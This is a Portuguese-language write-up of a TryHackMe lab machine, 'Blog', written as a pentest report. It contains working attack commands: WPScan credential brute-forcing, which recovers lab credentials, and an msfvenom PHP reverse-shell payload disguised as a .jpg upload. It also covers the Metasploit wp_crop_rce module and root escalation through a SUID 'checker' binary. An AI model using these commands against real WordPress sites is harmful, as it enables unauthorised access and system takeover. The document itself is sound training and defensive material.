# 1 — Visão geral da metodologia

1. **Objetivo:** Explorar o WordPress vulnerável, identificar falhas e comprometer o host como root.
    
2. **Estrutura:** Recon → Enumeração WP → Shell web → Privesc via variável de ambiente → Flags.
    
3. **Princípios:** Exploração reprodutível com comandos documentados.
    

---

# Report — Máquina: `Blog` — `10.64.131.151`

- **Fonte:** THM
    
- **Data:** 2025-11-28
    
- **Autor:** _Enrico Moreno_
    
- **Nível:** Medium
    
- **Início:** 14:10
    
- **Finalizado:** 16:00
    
- **Tempo gasto:** 1h 50m
    

---

## 1) Executive summary

CMS WordPress com credenciais fracas permitiu upload de payload malicioso e execução RCE. Elevação de privilégio via binário vulnerável `checker` possibilitou acesso root e obtenção das duas flags.

---

## 2) Escopo e limitações

- **Alvo:** 10.64.131.151
    
- **Serviços:** HTTP / SSH / Samba
    
- **Ferramentas utilizadas:** Nmap, Gobuster, WPScan, msfvenom, Metasploit, LinPEAS
    
- **Limitações:** sem restrições do lab
    

---

## 3) Metodologia aplicada

- Recon completa do host
    
- Enumeração HTTP e WordPress
    
- Descoberta de usuários e brute-force de credenciais
    
- Upload de webshell e RCE
    
- LinPEAS para pós-exploração
    
- Root privesc via variável de ambiente em binário setuid
    

---

## 4) Achado principal

**Vulnerabilidade:**  
WordPress vulnerável + credenciais fracas + upload inseguro  
**Local:** Dashboard WP do usuário **kwheel**  
**PoC simplificada:**

`msfvenom -p php/reverse_php LHOST=<SEU_IP> LPORT=1234 -f raw -o shell.php mv shell.php shell.php.jpg`

---

## 5) Evidências / PoC (resumo)

### Scan inicial

`sudo nmap -Pn -sS -sV -T4 -p- -O 10.64.131.151 -oN ~/Desktop/Nmap_Blog.txt`

→ WordPress identificado

### Enumeração com WPScan

→ Usuários:

- `bjoel`
    
- `kwheel`
    

### Brute-force

`wpscan --url http://10.64.131.151 --usernames bjoel,kwheel --passwords rockyou.txt`

→ Credenciais obtidas:  
`kwheel : cutiepie1`

### Acesso painel WordPress + RCE

Payload de reverse shell com Metasploit seguido de execução

### Root via binário vulnerável

`export admin=1 /usr/sbin/checker`

→ root shell

---

## 6) Impacto & Severidade

**Severidade:** **Alta / Crítica**  
WordPress mal configurado + privesc trivial = **comprometimento total** do sistema.

---

## 7) Reproduzir (passo-a-passo)

1️⃣ Scan serviços:

`sudo nmap -Pn -sS -sV -T4 -p- 10.64.131.151`

2️⃣ WPScan enum + brute-force:

`wpscan -–url http://10.64.131.151 --enumerate u wpscan --url http://10.64.131.151 --usernames kwheel --passwords rockyou.txt`

3️⃣ Logar no dashboard WP

4️⃣ Upload exploit ou:

`use multi/http/wp_crop_rce`

5️⃣ Shell reversa

6️⃣ Executar LinPEAS

7️⃣ Privesc via `checker`:

`export admin=1 /usr/sbin/checker whoami  # root`

8️⃣ Capturar flags

---

## 8) Recomendações (gestores)

- Fortalecer senha e autenticação no WordPress
    
- Bloquear uploads com execução em `/uploads`
    
- Remover binários SUID não essenciais
    
- Atualizações regulares em WordPress e plugins
    

---

## 9) Recomendações técnicas

- Configurar diretórios de upload com `noexec`
    
- Uso de MFA e políticas de senha robustas
    
- Remover SUID do `checker`:
    

`chmod -s /usr/sbin/checker`

- WP hardening: desabilitar JSON API quando não necessário
    

---

## 10) Apêndice técnico

#### Nmap

![](Nmap_Blog.txt)

#### Gobuster

![](Gobuster_Blog.txt)

#### WPScan

![](BruteForceWP_Blog.txt)

---

## 11) Lições aprendidas / Follow-up

- WordPress quase sempre exige enumeração agressiva
    
- Mesmo sem exploits diretos → credenciais fracas resolvem
    
- Verificar binários SUID e variáveis de ambiente em privesc
